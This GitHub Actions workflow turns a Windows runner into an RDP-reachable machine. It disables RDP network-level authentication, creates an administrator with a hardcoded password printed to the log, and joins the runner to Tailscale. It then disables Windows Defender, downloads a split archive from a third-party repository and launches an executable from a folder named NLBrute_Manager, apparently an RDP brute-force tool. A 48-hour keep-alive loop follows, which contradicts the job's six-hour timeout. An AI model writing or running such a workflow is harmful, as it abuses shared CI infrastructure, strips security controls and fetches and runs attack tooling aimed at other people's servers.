name: Windows Cloud RDP

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: 1. Enable Remote Desktop & Firewall
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0

      - name: 2. Create Admin Account
        run: |
          $Password = ConvertTo-SecureString "P@ssw0rd1qazXSW@#" -AsPlainText -Force
          New-LocalUser -Name "NvDAdmin" -Password $Password -PasswordNeverExpires -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Administrators" -Member "NvDAdmin" -ErrorAction SilentlyContinue
          net user runneradmin P@ssw0rd1qazXSW@#

      - name: 3. Install & Connect Tailscale VPN
        env:
          TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
        run: |
          # Download and install Tailscale silently
          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi"
          Start-Process msiexec -ArgumentList "/i C:\tailscale.msi /quiet /norestart" -Wait
          
          # Connect to Tailscale network
          Start-Sleep -Seconds 5
          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="github-rdp-server"
          
          Start-Sleep -Seconds 8
          
          # Get Tailscale IP
          $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
          
          Write-Host ""
          Write-Host "==================================================" -ForegroundColor Green
          Write-Host "  >>> RDP SERVER IS READY! <<<" -ForegroundColor Cyan
          Write-Host "  Tailscale IP : $ts_ip" -ForegroundColor Yellow
          Write-Host "  Username     : NvdAdmin" -ForegroundColor Yellow
          Write-Host "  Password     : P@ssw0rd1qazXSW@#" -ForegroundColor Yellow
          Write-Host "  >> Open mstsc and connect to: $ts_ip" -ForegroundColor Magenta
          Write-Host "==================================================" -ForegroundColor Green

      - name: 4. Setup Environment & Deploy Files
        shell: powershell
        run: |
          # 1. Define Paths
          $baseDir = "$env:USERPROFILE\Desktop\Downloads\multinl_zip"
          $targetDir = "$baseDir\multinl\NLBrute_Manager"
          
          # 2. Create Directory Structure
          New-Item -ItemType Directory -Force -Path $baseDir | Out-Null
          Set-Location -Path $baseDir

          # 3. Disable Windows Defender to prevent file quarantine
          Write-Host "Disabling Windows Defender Real-Time Monitoring..." -ForegroundColor Cyan
          Set-MpPreference -DisableRealtimeMonitoring $true
          Set-MpPreference -DisableIOAVProtection $true
          
          # 4. Download Split Zip Files (Using Raw URLs)
          $filesToDownload = @(
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z01",
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z02",
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z03",
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.zip"
          )

          foreach ($url in $filesToDownload) {
              $fileName = Split-Path $url -Leaf
              Write-Host "Downloading $fileName..." -ForegroundColor Yellow
              Invoke-WebRequest -Uri $url -OutFile $fileName
          }

          # 5. Extracting the Archive
          # We use the main .zip file. For split zips, they must be in the same folder.
          Write-Host "Extracting multi-part archive..." -ForegroundColor Cyan
          try {
              Expand-Archive -Path "$baseDir\multinl_zip.zip" -DestinationPath $baseDir -Force
              Write-Host "Extraction successful." -ForegroundColor Green
          } catch {
              Write-Host "Extraction failed. Attempting manual extraction via Shell..." -ForegroundColor Red
              # Fallback if Expand-Archive struggles with split volumes
              & cmd /c "tar -xf multinl_zip.zip -C $baseDir"
          }

          # 6. Launch the Application
          Write-Host "Searching for executable in $targetDir..." -ForegroundColor Cyan
          if (Test-Path $targetDir) {
              $exeFiles = Get-ChildItem -Path $targetDir -Filter "*.exe" -Recurse
              if ($exeFiles.Count -gt 0) {
                  $exeToRun = $exeFiles[0].FullName
                  Write-Host "Found: $exeToRun. Launching..." -ForegroundColor Green
                  
                  # Set Execution Policy to Bypass for the current process
                  Set-ExecutionPolicy Bypass -Scope Process -Force
                  
                  # Launch the app without blocking the workflow
                  Start-Process -FilePath $exeToRun -WorkingDirectory $targetDir -WindowStyle Normal
              } else {
                  Write-Host "No .exe found in $targetDir" -ForegroundColor Red
              }
          } else {
              Write-Host "Target directory $targetDir not found after extraction." -ForegroundColor Red
          }

      - name: 5. Keep Server Alive (48 Hours)
        run: |
          for ($i = 1; $i -le 2880; $i++) {
            Start-Sleep -Seconds 60
            Write-Host "[$i/2880] Server running..."
          }
